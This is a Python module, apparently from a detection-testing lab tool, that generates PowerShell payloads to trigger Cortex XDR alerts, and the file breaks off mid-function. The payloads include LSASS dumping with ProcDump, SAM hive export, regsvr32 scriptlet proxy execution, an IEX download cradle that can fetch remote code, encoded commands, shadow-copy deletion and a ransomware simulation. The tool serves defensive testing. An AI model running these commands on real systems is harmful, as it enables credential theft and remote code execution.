# modules/xdr_orchestration/payloads.py
#
# Built-in payloads: endpoint actions that are NOT Atomic Red Team tests, run by the
# executor over the same WinRM channel. A story step selects one with
#   technique: {id: T1204.002, executor: builtin, payload: wildfire_pe}
#
# Each payload is a fixed, reviewed PowerShell script (no caller-supplied code; the
# only inputs are validated strings inserted single-quoted) that prints ONE line of
# compact JSON, which the executor parses into ExecResult.outputs. Outputs feed the
# step's synthetic network events (same file name / hash / URL), so the endpoint and
# network halves describe one download.
#
# wildfire_pe -- Palo Alto's WildFire malware test PE.
#   Source: the WildFire API /test resource (no API key). The non-SSL URL is used
#   because the lab NGFW does not decrypt. "Each time you download the test file,
#   it has a different SHA-256 hash value" and its verdict is always malware, so
#   every run is a never-seen sample: the Cortex agent finds no cached verdict, the
#   tenant submits it to WildFire, and the malware verdict raises the agent's
#   WildFire malware alert (Cortex XSIAM onboarding health checks list exactly this:
#   "Cortex XDR agent generates WildFire malware issues").
#   It is written to C:\Users\Public\Downloads -- deliberately OUTSIDE the Atomic
#   allow-list paths (C:\AtomicRedTeam\, the user's AppData\Local\Temp\) that the
#   setup guide exempts from malware scanning; a file there would never be judged.
#   The script then executes it (the agent evaluates PE files at execution) and
#   reports whether the agent blocked execution or quarantined the file. Blocked or
#   quarantined is a SUCCESS for this payload: it is the detection we want.
#
#   The file is LEFT ON DISK after the run. An unknown hash is allowed to run while
#   the agent uploads it to WildFire in the background; the verdict -- and the alert --
#   come minutes later. On 2026-11-18 a cleanup step deleted the file 15 s after it
#   ran: the agent logged FILE_WRITE + PROCESS_START but never a verdict, and no alert
#   came. So each run instead deletes the PREVIOUS runs' test files before
#   downloading, leaving at most one (always-malware-verdict) test file on the box.

import json
import re
from typing import Optional

WILDFIRE_TEST_URL = "http://wildfire.paloaltonetworks.com/publicapi/test/pe"
WILDFIRE_DROP_DIR = r"C:\Users\Public\Downloads"

_SAFE_TAG = re.compile(r"^[a-z0-9]{1,16}$")
# A cradle URL override, if the operator passes one. Only http/https/file, and no
# quotes/semicolons/ampersands/whitespace -- it is inserted into a PowerShell command
# line, so the character class keeps it from breaking out of its single-quoted spot.
_SAFE_URL = re.compile(r"""^(https?|file)://[^'";|&<>`\s]{1,300}$""", re.I)


def _q(value) -> str:
    """PowerShell single-quoted literal (no expansion inside single quotes)."""
    return "'" + str(value).replace("'", "''") + "'"


def wildfire_file_path(tag: str) -> str:
    return WILDFIRE_DROP_DIR + "\\" + f"wildfire-test-pe-file-{tag}.exe"


def _wildfire_execute(params: dict) -> str:
    tag = params["tag"]
    return (
        "$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Continue'\n"
        f"$url = {_q(WILDFIRE_TEST_URL)}\n"
        f"$dir = {_q(WILDFIRE_DROP_DIR)}\n"
        f"$path = {_q(wildfire_file_path(tag))}\n"
        "$r = [ordered]@{ url = $url; path = $path; file_name = (Split-Path $path -Leaf) }\n"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null\n"
        # Housekeeping: remove EARLIER runs' test files. This run's file must stay on
        # disk -- see the module note on why cleanup is deferred to the next run.
        "$old = Get-ChildItem -Path $dir -Filter 'wildfire-test-pe-file-*.exe' -ErrorAction SilentlyContinue\n"
        "$r.removed_previous = @($old | ForEach-Object { $n = $_.Name;"
        " Remove-Item -Force $_.FullName -ErrorAction SilentlyContinue; $n })\n"
        "try { Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -TimeoutSec 60;"
        " $r.downloaded = $true }\n"
        "catch { $r.downloaded = $false; $r.download_error = $_.Exception.Message }\n"
        "Start-Sleep -Seconds 3\n"
        "$r.present_after_download = Test-Path $path\n"
        "if ($r.present_after_download) {\n"
        "  try { $r.sha256 = (Get-FileHash -Path $path -Algorithm SHA256).Hash.ToLower();"
        " $r.size = (Get-Item $path).Length } catch { $r.hash_error = $_.Exception.Message }\n"
        "  try {\n"
        "    $p = Start-Process -FilePath $path -PassThru -WindowStyle Hidden -ErrorAction Stop\n"
        "    Start-Sleep -Seconds 5\n"
        "    if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue }\n"
        "    $r.executed = $true\n"
        "  } catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "}\n"
        "Start-Sleep -Seconds 5\n"
        "$r.present_at_end = Test-Path $path\n"
        "$r | ConvertTo-Json -Compress\n"
    )


def _wildfire_cleanup(params: dict) -> str:
    return (
        f"$path = {_q(wildfire_file_path(params['tag']))}\n"
        "if (Test-Path $path) { Remove-Item -Force $path -ErrorAction SilentlyContinue }\n"
        "@{ removed = -not (Test-Path $path) } | ConvertTo-Json -Compress\n"
    )


def _wildfire_judge(rc, out: dict) -> tuple:
    """(ok, detail). ok = the sample reached the box (or the agent stopped it on
    arrival). A failed download with no agent action is the only failure."""
    if not out:
        return False, f"no result from payload (rc={rc})"
    sha = out.get("sha256")
    if not out.get("downloaded"):
        return False, f"download failed: {out.get('download_error') or 'unknown error'}"
    if not out.get("present_after_download"):
        return True, "downloaded, then removed on write (agent quarantine)"
    bits = [f"downloaded {out.get('file_name')} sha256={sha[:16] + '…' if sha else '?'}"]
    if out.get("executed") is False:
        bits.append(f"execution blocked ({(out.get('exec_error') or '')[:80]})")
    elif out.get("executed"):
        bits.append("executed")
    if out.get("present_at_end") is False:
        bits.append("file then quarantined")
    return True, "; ".join(bits)


# ─────────────────────────────────────────────────────────────────────────────
# procdump_lsass -- OS Credential Dumping: LSASS Memory (T1003.001) with a signed
#   tool. Downloads Sysinternals ProcDump to C:\Users\Public\Downloads (outside the
#   Atomic allow-list paths) and runs `procdump -accepteula -ma lsass.exe <dmp>`.
#   The agent's Credential Gathering / LSASS-access detection fires on a legitimately
#   Microsoft-signed binary -- a complement to the comsvcs.dll MiniDump path, which
#   proves the *behavioral* detection rather than a file signature. The LSASS dump
#   (real process memory) is deleted immediately after the access attempt -- the
#   detection already fired on the attempt -- and the tool is removed by cleanup.
#   SUCCESS = the tool reached the box and the dump was attempted (whether the agent
#   let it write the dump or blocked it); only a failed download is a failure.
#
#   ProcDump is PRE-STAGED by the Kickstarter at PROCDUMP_STAGED (so a box that
#   restricts runtime egress still works, and the box reaches Sysinternals only once
#   at setup). The payload copies that staged binary to the per-run path when it is
#   present, and falls back to downloading it live when it is not -- so the stage
#   works whether or not the box was kickstarted. Keep PROCDUMP_STAGED in sync with
#   the Kickstarter (kickstarter.py stages to this exact path).

PROCDUMP_URL = "https://live.sysinternals.com/procdump64.exe"
TOOLS_DIR = r"C:\ProgramData\LogSim"               # Kickstarter staging dir (see kickstarter.py)
PROCDUMP_STAGED = TOOLS_DIR + r"\procdump64.exe"
MIMIKATZ_STAGED = TOOLS_DIR + r"\mimikatz.exe"
LAZAGNE_STAGED = TOOLS_DIR + r"\LaZagne.exe"


def _drop(name: str) -> str:
    return WILDFIRE_DROP_DIR + "\\" + name


def procdump_paths(tag: str):
    return _drop(f"procdump-{tag}.exe"), _drop(f"lsass-{tag}.dmp")


def _procdump_execute(params: dict) -> str:
    exe, dmp = procdump_paths(params["tag"])
    return (
        "$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Continue'\n"
        f"$url = {_q(PROCDUMP_URL)}\n"
        f"$dir = {_q(WILDFIRE_DROP_DIR)}\n"
        f"$exe = {_q(exe)}\n"
        f"$dmp = {_q(dmp)}\n"
        f"$staged = {_q(PROCDUMP_STAGED)}\n"
        "$r = [ordered]@{ url = $url; exe = $exe; dmp_name = (Split-Path $dmp -Leaf); tool = 'procdump' }\n"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null\n"
        # Housekeeping: remove earlier runs' tool copies and any stale dumps.
        "Get-ChildItem -Path $dir -Filter 'procdump-*.exe' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue\n"
        "Get-ChildItem -Path $dir -Filter 'lsass-*.dmp' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue\n"
        "$r.downloaded = $false\n"
        # Prefer the Kickstarter-staged copy; fall back to a live download.
        "if (Test-Path $staged) {\n"
        "  try { Copy-Item -Path $staged -Destination $exe -Force; $r.source = 'staged'; $r.downloaded = $true }\n"
        "  catch { $r.stage_error = $_.Exception.Message }\n"
        "}\n"
        "if (-not $r.downloaded) {\n"
        "  try { Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing -TimeoutSec 60; $r.source = 'download'; $r.downloaded = $true }\n"
        "  catch { $r.download_error = $_.Exception.Message }\n"
        "}\n"
        "Start-Sleep -Seconds 2\n"
        "$r.present_after_download = Test-Path $exe\n"
        "if ($r.present_after_download) {\n"
        "  try { $r.sha256 = (Get-FileHash -Path $exe -Algorithm SHA256).Hash.ToLower() } catch {}\n"
        "  try {\n"
        "    $p = Start-Process -FilePath $exe -ArgumentList '-accepteula','-ma','lsass.exe',$dmp -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop\n"
        "    $r.procdump_rc = $p.ExitCode; $r.executed = $true\n"
        "  } catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "  Start-Sleep -Seconds 2\n"
        "  $r.dump_created = Test-Path $dmp\n"
        "  if ($r.dump_created) { try { $r.dump_size = (Get-Item $dmp).Length } catch {} }\n"
        # The dump is LSASS memory -- delete it at once; the detection fired on access.
        "  if (Test-Path $dmp) { Remove-Item -Force $dmp -ErrorAction SilentlyContinue }\n"
        "}\n"
        "$r | ConvertTo-Json -Compress\n"
    )


def _procdump_cleanup(params: dict) -> str:
    exe, dmp = procdump_paths(params["tag"])
    return (
        f"$exe = {_q(exe)}\n"
        f"$dmp = {_q(dmp)}\n"
        "foreach ($p in @($exe,$dmp)) { if (Test-Path $p) { Remove-Item -Force $p -ErrorAction SilentlyContinue } }\n"
        "@{ removed = (-not (Test-Path $exe)) -and (-not (Test-Path $dmp)) } | ConvertTo-Json -Compress\n"
    )


def _procdump_judge(rc, out: dict) -> tuple:
    if not out:
        return False, f"no result from payload (rc={rc})"
    if not out.get("downloaded"):
        return False, f"ProcDump download failed: {out.get('download_error') or 'unknown error'}"
    if not out.get("present_after_download"):
        return True, "ProcDump downloaded, then removed on write (agent quarantine)"
    bits = ["ProcDump downloaded"]
    if out.get("executed") is False:
        bits.append(f"execution blocked ({(out.get('exec_error') or '')[:80]})")
    elif out.get("dump_created"):
        bits.append(f"LSASS dumped ({out.get('dump_size', '?')} bytes) then deleted")
    else:
        bits.append(f"LSASS dump attempted, no dump written (rc={out.get('procdump_rc')}) -- agent blocked")
    return True, "; ".join(bits)


# ─────────────────────────────────────────────────────────────────────────────
# squiblydoo -- Signed Binary Proxy Execution: Regsvr32 (T1218.010). Stages a benign
#   COM scriptlet and runs `regsvr32 /s /n /u /i:<sct> scrobj.dll`, so regsvr32
#   proxy-executes script and spawns a child process -- the Squiblydoo behaviour the
#   Cortex agent's Behavioral Threat Protection flags. The scriptlet only writes a
#   marker file (no real payload). A LOCAL scriptlet is used (not a remote URL) so the
#   stage is self-contained; the detection keys on the regsvr32/scrobj behaviour, not
#   on the fetch. Scriptlet + marker are removed by cleanup.
#   SUCCESS = the scriptlet staged and regsvr32 was invoked (blocked child = still a
#   detection); only a failure to stage the scriptlet is a failure.

def squiblydoo_paths(tag: str):
    return _drop(f"sqd-{tag}.sct"), _drop(f"sqd-{tag}.marker")


def _squiblydoo_execute(params: dict) -> str:
    tag = params["tag"]
    sct, marker = squiblydoo_paths(tag)
    sct_xml = (
        '<?XML version="1.0"?>\r\n'
        '<scriptlet>\r\n'
        '<registration progid="SqdTest" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">\r\n'
        '<script language="JScript">\r\n'
        '<![CDATA[\r\n'
        'new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo squiblydoo-__TAG__> \\"__MARKER__\\"", 0, true);\r\n'
        ']]>\r\n'
        '</script>\r\n'
        '</registration>\r\n'
        '</scriptlet>\r\n'
    ).replace("__TAG__", tag).replace("__MARKER__", marker)
    return (
        "$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Continue'\n"
        f"$dir = {_q(WILDFIRE_DROP_DIR)}\n"
        f"$sct = {_q(sct)}\n"
        f"$marker = {_q(marker)}\n"
        "$r = [ordered]@{ sct = $sct; technique = 'squiblydoo'; marker_name = (Split-Path $marker -Leaf) }\n"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null\n"
        "if (Test-Path $marker) { Remove-Item -Force $marker -ErrorAction SilentlyContinue }\n"
        f"$sctBody = {_q(sct_xml)}\n"
        "try { Set-Content -Path $sct -Value $sctBody -Encoding ASCII -NoNewline; $r.sct_written = Test-Path $sct }\n"
        "catch { $r.sct_written = $false; $r.write_error = $_.Exception.Message }\n"
        "if ($r.sct_written) {\n"
        "  $regargs = @('/s','/n','/u',('/i:' + $sct),'scrobj.dll')\n"
        "  try {\n"
        "    $p = Start-Process -FilePath 'regsvr32.exe' -ArgumentList $regargs -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop\n"
        "    $r.regsvr32_rc = $p.ExitCode; $r.executed = $true\n"
        "  } catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "  Start-Sleep -Seconds 3\n"
        "  $r.marker_created = Test-Path $marker\n"
        "}\n"
        "$r | ConvertTo-Json -Compress\n"
    )


def _squiblydoo_cleanup(params: dict) -> str:
    sct, marker = squiblydoo_paths(params["tag"])
    return (
        f"$sct = {_q(sct)}\n"
        f"$marker = {_q(marker)}\n"
        "foreach ($p in @($sct,$marker)) { if (Test-Path $p) { Remove-Item -Force $p -ErrorAction SilentlyContinue } }\n"
        "@{ removed = (-not (Test-Path $sct)) -and (-not (Test-Path $marker)) } | ConvertTo-Json -Compress\n"
    )


def _squiblydoo_judge(rc, out: dict) -> tuple:
    if not out:
        return False, f"no result from payload (rc={rc})"
    if not out.get("sct_written"):
        return False, f"could not stage the scriptlet: {out.get('write_error') or 'unknown error'}"
    bits = ["regsvr32 scrobj.dll /i ran"]
    if out.get("executed") is False:
        bits.append(f"blocked ({(out.get('exec_error') or '')[:80]})")
    elif out.get("marker_created"):
        bits.append("scriptlet executed (marker written)")
    else:
        bits.append(f"no marker (rc={out.get('regsvr32_rc')}) -- agent likely blocked the child process")
    return True, "; ".join(bits)


# ─────────────────────────────────────────────────────────────────────────────
# vss_shadow_delete -- Inhibit System Recovery (T1490). A process invoking vssadmin
#   to delete volume shadow copies is the ransomware-prep behaviour the Cortex agent
#   flags and usually PREVENTS. NON-DESTRUCTIVE by design: the payload targets a
#   random, non-existent shadow id, so no real shadow copy is removed, while the
#   command line the behavioral detector keys on (`vssadmin delete shadows ...`) is
#   still produced. vssadmin returns "no items found"; the detection fires on the
#   attempt. To demo a hard wipe instead (deletes real restore points), the command
#   would use `delete shadows /all /quiet` -- deliberately NOT the default.
#   SUCCESS = vssadmin was invoked (an agent that blocks it from launching is itself
#   the detection); only no output at all is a failure. No cleanup (nothing created).

def _vss_execute(params: dict) -> str:
    return (
        "$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Continue'\n"
        "$r = [ordered]@{ technique = 'inhibit_system_recovery'; destructive = $false }\n"
        "$sid = '{' + [guid]::NewGuid().ToString() + '}'\n"
        "$r.shadow_id = $sid\n"
        "$r.command = \"vssadmin delete shadows /shadow=$sid /quiet\"\n"
        "try {\n"
        "  $p = Start-Process -FilePath 'vssadmin.exe' -ArgumentList 'delete','shadows',\"/shadow=$sid\",'/quiet' -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop\n"
        "  $r.vssadmin_rc = $p.ExitCode; $r.executed = $true\n"
        "} catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "$r | ConvertTo-Json -Compress\n"
    )


def _vss_cleanup(params: dict) -> str:
    return "@{ removed = $true } | ConvertTo-Json -Compress\n"


def _vss_judge(rc, out: dict) -> tuple:
    if not out:
        return False, f"no result from payload (rc={rc})"
    if out.get("executed"):
        return True, (f"vssadmin delete shadows invoked (non-destructive, shadow "
                      f"{out.get('shadow_id')}); rc={out.get('vssadmin_rc')}")
    return True, (f"vssadmin could not launch ({(out.get('exec_error') or '')[:80]}) "
                  "-- the agent may have blocked it")


# ─────────────────────────────────────────────────────────────────────────────
# download_cradle -- Command and Scripting Interpreter: PowerShell (T1059.001), the
#   classic `IEX (New-Object Net.WebClient).DownloadString(<url>)` cradle. Cortex's
#   behavioral / command-line analytics key on the deobfuscated script block --
#   System.Net.WebClient + DownloadString + Invoke-Expression -- so the detection
#   fires on the COMMAND-LINE SHAPE, not on what the content does.
#
#   This is why it is run as a real CHILD powershell.exe with the cradle literal on
#   its command line (Start-Process powershell.exe -Command "IEX (New-Object ...)"),
#   NOT through the executor's base64/certutil delivery -- that delivery exists to
#   AVOID an encoded-command alert when shipping legit scripts, and here we WANT the
#   cradle visible on a process command line, so the agent sees exactly the artifact.
#
#   Benign by default and self-contained: the payload first stages a tiny LOCAL
#   script that does nothing but write a marker file, and the cradle's default URL is
#   a file:// URL pointing at that staged script. So no bytes leave the box and the
#   only thing IEX ever runs is our own marker write -- the detectable behaviour
#   (WebClient.DownloadString + IEX) is produced with fully controlled content, the
#   same "local, behaviour-keyed" approach as squiblydoo/mshta.
#
#   An operator can pass a real http(s) `url` to make it a TRUE-EGRESS cradle (the
#   child then fetches and IEX-es whatever that URL serves -- point it only at
#   content you trust; the marker will not be written since our script isn't fetched).
#   The script + marker are removed by cleanup.
#   SUCCESS = the cradle ran (marker written = full fetch+execute; blocked child or
#   no marker is still the detection); only a failure to stage the script, or no
#   output at all, is a failure.

def cradle_paths(tag: str):
    return _drop(f"cradle-{tag}.ps1"), _drop(f"cradle-{tag}.marker")


def _download_cradle_execute(params: dict) -> str:
    tag = params["tag"]
    ps1, marker = cradle_paths(tag)
    url_override = params.get("url") or ""          # validated by validate_params
    # The staged script: nothing but a marker write, so IEX of it is provably benign.
    ps1_body = f"Set-Content -Path '{marker}' -Value 'cradle-{tag}' -Encoding ASCII\r\n"
    return (
        "$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Continue'\n"
        f"$dir = {_q(WILDFIRE_DROP_DIR)}\n"
        f"$ps1 = {_q(ps1)}\n"
        f"$marker = {_q(marker)}\n"
        f"$override = {_q(url_override)}\n"
        "$r = [ordered]@{ technique = 'powershell_download_cradle'; ps1 = $ps1; marker_name = (Split-Path $marker -Leaf) }\n"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null\n"
        "if (Test-Path $marker) { Remove-Item -Force $marker -ErrorAction SilentlyContinue }\n"
        # Stage the benign marker-writing script.
        f"try {{ Set-Content -Path $ps1 -Value {_q(ps1_body)} -Encoding ASCII; $r.staged = Test-Path $ps1 }}\n"
        "catch { $r.staged = $false; $r.stage_error = $_.Exception.Message }\n"
        # Default to a file:// URL for the staged script; use the override when given.
        "if ($override) { $url = $override; $r.remote = $true } else { $url = 'file:///' + ($ps1 -replace '\\\\','/'); $r.remote = $false }\n"
        "$r.url = $url\n"
        # Remote-mode only: surface the fetched host so the orchestrator can pin the
        # synthetic perimeter egress (firewall/web proxy) to the same destination.
        "if ($r.remote) { try { $r.host = ([Uri]$url).Host } catch {} }\n"
        "if ($r.staged -or $r.remote) {\n"
        # The canonical cradle, on a child powershell.exe command line (the detection target).
        "  $cmd = \"IEX (New-Object System.Net.WebClient).DownloadString('$url')\"\n"
        "  $r.cradle = $cmd\n"
        "  $psargs = \"-NoProfile -NonInteractive -Command `\"$cmd`\"\"\n"
        "  try {\n"
        "    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $psargs -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop\n"
        "    $r.rc = $p.ExitCode; $r.executed = $true\n"
        "  } catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "  Start-Sleep -Seconds 2\n"
        "  $r.marker_created = Test-Path $marker\n"
        "}\n"
        "$r | ConvertTo-Json -Compress\n"
    )


def _download_cradle_cleanup(params: dict) -> str:
    ps1, marker = cradle_paths(params["tag"])
    return (
        f"foreach ($p in @({_q(ps1)},{_q(marker)})) {{ if (Test-Path $p) {{ Remove-Item -Force $p -ErrorAction SilentlyContinue }} }}\n"
        f"@{{ removed = ((-not (Test-Path {_q(ps1)})) -and (-not (Test-Path {_q(marker)}))) }} | ConvertTo-Json -Compress\n"
    )


def _download_cradle_judge(rc, out: dict) -> tuple:
    if not out:
        return False, f"no result from payload (rc={rc})"
    if out.get("remote") is False and not out.get("staged"):
        return False, f"could not stage the cradle script: {out.get('stage_error') or 'unknown error'}"
    where = "remote" if out.get("remote") else "local file://"
    bits = [f"IEX WebClient.DownloadString cradle ran ({where})"]
    if out.get("executed") is False:
        bits.append(f"child powershell blocked ({(out.get('exec_error') or '')[:80]})")
    elif out.get("marker_created"):
        bits.append("fetched + executed (marker written)")
    elif out.get("remote"):
        bits.append(f"child ran (rc={out.get('rc')}; remote URL -- no marker expected)")
    else:
        bits.append(f"no marker (rc={out.get('rc')}) -- agent likely blocked the IEX")
    return True, "; ".join(bits)


# ─────────────────────────────────────────────────────────────────────────────
# encoded_command -- Obfuscated Files or Information: Command Obfuscation (T1027.010),
#   the `powershell.exe -EncodedCommand <base64>` pattern. The detector keys on the
#   -EncodedCommand / -enc flag carrying a base64 UTF-16LE blob on a powershell command
#   line -- a near-universal "suspicious PowerShell" / encoded-command heuristic.
#
#   As with download_cradle, this is run as a real CHILD powershell.exe with the
#   encoded blob on ITS command line, and deliberately NOT through the executor's
#   base64/certutil delivery -- that delivery exists precisely to AVOID an
#   encoded-command alert when shipping legit scripts, so here we invert it and WANT
#   the -EncodedCommand flag visible on a process command line.
#
#   Benign: the decoded command does nothing but write a marker file and print a line.
#   The blob is built on the box (Convert::ToBase64String of the UTF-16LE bytes, the
#   exact encoding -EncodedCommand expects) so the inner command is fully controlled.
#   Marker removed by cleanup.
#   SUCCESS = the encoded child ran (marker written = decoded + executed; a blocked
#   child or no marker is still the detection); only no output at all is a failure.

def encoded_marker(tag: str) -> str:
    return _drop(f"encoded-{tag}.marker")


def _encoded_command_execute(params: dict) -> str:
    tag = params["tag"]
    marker = encoded_marker(tag)
    return (
        "$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Continue'\n"
        f"$dir = {_q(WILDFIRE_DROP_DIR)}\n"
        f"$marker = {_q(marker)}\n"
        "$r = [ordered]@{ technique = 'encoded_command'; marker_name = (Split-Path $marker -Leaf) }\n"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null\n"
        "if (Test-Path $marker) { Remove-Item -Force $marker -ErrorAction SilentlyContinue }\n"
        # The benign inner command: write a marker + print a line. $marker expands here;
        # the single quotes around it are literal (the path has none).
        "$inner = \"Set-Content -Path '$marker' -Value 'encoded-" + tag + "' -Encoding ASCII; Write-Host 'logsim encoded command ran'\"\n"
        # Base64 of the UTF-16LE bytes -- exactly what -EncodedCommand decodes.
        "$b64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($inner))\n"
        "$r.encoded = $b64\n"
        "$psargs = \"-NoProfile -NonInteractive -EncodedCommand $b64\"\n"
        "$r.cmdline = \"powershell.exe $psargs\"\n"
        "try {\n"
        "  $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $psargs -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop\n"
        "  $r.rc = $p.ExitCode; $r.executed = $true\n"
        "} catch { $r.executed = $false; $r.exec_error = $_.Exception.Message }\n"
        "Start-Sleep -Seconds 2\n"
        "$r.marker_created = Test-Path $marker\n"
        "$r | ConvertTo-Json -Compress\n"
    )


def _encoded_command_cleanup(params: dict) -> str:
    marker = encoded_marker(params["tag"])
    return (
        f"$marker = {_q(marker)}\n"
        "if (Test-Path $marker) { Remove-Item -Force $marker -ErrorAction SilentlyContinue }\n"
        "@{ removed = (-not (Test-Path $marker)) } | ConvertTo-Json -Compress\n"
    )


def _encoded_command_judge(rc, out: dict) -> tuple:
    if not out:
        return False, f"no result from payload (rc={rc})"
    bits = ["powershell.exe -EncodedCommand (base64) ran"]
    if out.get("executed") is False:
        bits.append(f"child blocked ({(out.get('exec_error') or '')[:80]})")
    elif out.get("marker_created"):
        bits.append("decoded + executed (marker written)")
    else:
        bits.append(f"no marker (rc={out.get('rc')}) -- agent likely blocked the encoded child")
    return True, "; ".join(bits)


PAYLOADS = {
    "wildfire_pe": {
        "description": "Download + run Palo Alto's WildFire test PE (unique hash per download)",
        "execute": _wildfire_execute,
        "cleanup": _wildfire_cleanup,
        "judge": _wildfire_judge,
        "needs": ("tag",),
    },
    "procdump_lsass": {
        "description": "Download Sysinternals ProcDump + dump LSASS memory (signed tool, T1003.001)",
        "execute": _procdump_execute,
        "cleanup": _procdump_cleanup,
        "judge": _procdump_judge,
        "needs": ("tag",),
    },
    "squiblydoo": {
        "description": "regsvr32 scrobj.dll proxy execution of a local COM scriptlet (T1218.010)",
        "execute": _squiblydoo_execute,
        "cleanup": _squiblydoo_cleanup,
        "judge": _squiblydoo_judge,
        "needs": ("tag",),
    },
    "vss_shadow_delete": {
        "description": "Non-destructive vssadmin shadow-copy deletion attempt (T1490)",
        "execute": _vss_execute,
        "cleanup": _vss_cleanup,
        "judge": _vss_judge,
        "needs": (),
    },
    "download_cradle": {
        "description": "PowerShell IEX WebClient.DownloadString cradle; benign local file:// by default, optional http(s) url (T1059.001)",
        "execute": _download_cradle_execute,
        "cleanup": _download_cradle_cleanup,
        "judge": _download_cradle_judge,
        "needs": ("tag",),
    },
    "encoded_command": {
        "description": "powershell.exe -EncodedCommand (base64 UTF-16LE) of a benign marker write (T1027.010)",
        "execute": _encoded_command_execute,
        "cleanup": _encoded_command_cleanup,
        "judge": _encoded_command_judge,
        "needs": ("tag",),
    },
}


# ═════════════════════════════════════════════════════════════════════════════
# Scenario payloads (P4). Self-contained, non-destructive, cleanup-capable builtin
# payloads for four scenario stories: ransomware, real-tool credential theft, a
# LOLBin defense-evasion chain, and a persistence sweep. Each prints one compact
# JSON line judged by its _judge. Files/artifacts live under TOOLS_DIR or a per-run
# scratch dir, outside the Atomic allow-list.
# ═════════════════════════════════════════════════════════════════════════════

def _header() -> str:
    return "$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Continue'\n"


def _tool_judge(tool):
    def judge(rc, out):
        if not out:
            return False, f"no result from payload (rc={rc})"
        if not out.get("present"):
            return False, (f"{tool} is not staged on the box -- run the Kickstarter to stage it "
                           "(the download may be blocked by AV/EDR, which is itself a detection)")
        if out.get("executed"):
            return True, f"{tool} ran ({'creds observed' if out.get('creds_seen') else 'completed'})"
        return True, f"{tool} present; execution blocked ({(out.get('exec_error') or '')[:80]})"
    return judge


# ── Ransomware simulation (T1486) ──────────────────────────────────────────────
def ransomsim_dir(tag):      return _drop(f"ransomsim-{tag}")

def _ransomware_sim_execute(params):
    tag = params["tag"]
    d = ransomsim_dir(tag)
    return (
        _header() +
        f"$dir = {_q(d)}\n"
        f"$note = {_q(d + chr(92) + 'READ_ME_RANSOM-' + tag + '.txt')}\n"
        f"$ext = {_q('.' + tag + 'locked')}\n"
        "$r = [ordered]@{ technique = 'data_encrypted_for_impact'; dir = $dir }\n"
        "if (Test-Path $dir) { Remove-Item -Recurse -Force $dir -ErrorAction SilentlyContinue }\n"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null\n"
        "$n = 25\n"
        "for ($i = 0; $i -lt $n; $i++) { Set-Content -Path (Join-Path $dir \"doc_$i.txt\") -Value ((\"baseline business data $i \") * 40) -Encoding ASCII }\n"
        "$rng = New-Object System.Random; $enc = 0\n"
        "Get-ChildItem -Path $dir -Filter 'doc_*.txt' | ForEach-Object {\n"
        "  try { $b = New-Object byte[] 2048; $rng.NextBytes($b); [IO.File]::WriteAllBytes($_.FullName, $b);"
        " Rename-Item -Path $_.FullName -NewName ($_.Name + $ext) -ErrorAction SilentlyContinue; $enc++ } catch {}\n"
        "}\n"
        "Set-Content -Path $note -Value 'Your files have been encrypted. (LogSim ransomware SIMULATION -- scratch dir only, no real data affected.)' -Encoding ASCII\n"
        "$r.files_created = $n; $r.files_encrypted = $enc; $r.note_dropped = (Test-Path $note)\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _ransomware_sim_cleanup(params):
    return (f"$dir = {_q(ransomsim_dir(params['tag']))}\n"
            "if (Test-Path $dir) { Remove-Item -Recurse -Force $dir -ErrorAction SilentlyContinue }\n"
            "@{ removed = (-not (Test-Path $dir)) } | ConvertTo-Json -Compress\n")

def _ransomware_sim_judge(rc, out):
    if not out:
        return False, f"no result from payload (rc={rc})"
    enc = out.get("files_encrypted", 0)
    if enc > 0:
        return True, f"mass file encryption simulated ({enc}/{out.get('files_created')} files, ransom note dropped)"
    return True, "ransomware behaviour attempted; the agent blocked file modification"


# ── SAM hive dump (T1003.002) ──────────────────────────────────────────────────
def _sam_hive_dump_execute(params):
    tag = params["tag"]
    d = _drop(f"sam-{tag}")
    return (
        _header() +
        f"$dir = {_q(d)}\n"
        "$r = [ordered]@{ technique = 'sam_registry_dump' }\n"
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null\n"
        "$saved = @()\n"
        "foreach ($h in 'SAM','SYSTEM','SECURITY') {\n"
        "  $out = Join-Path $dir \"$h.hive\"\n"
        "  try { $p = Start-Process -FilePath 'reg.exe' -ArgumentList 'save',\"HKLM\\$h\",$out,'/y' -PassThru -WindowStyle Hidden -Wait -ErrorAction Stop; if (Test-Path $out) { $saved += $h } } catch {}\n"
        "}\n"
        "$r.saved = $saved; $r.count = @($saved).Count\n"
        # Sensitive: delete the hives immediately -- the detection fired on the save.
        "Remove-Item -Recurse -Force $dir -ErrorAction SilentlyContinue\n"
        "$r | ConvertTo-Json -Compress\n"
    )

def _sam_hive_dump_cleanup(params):
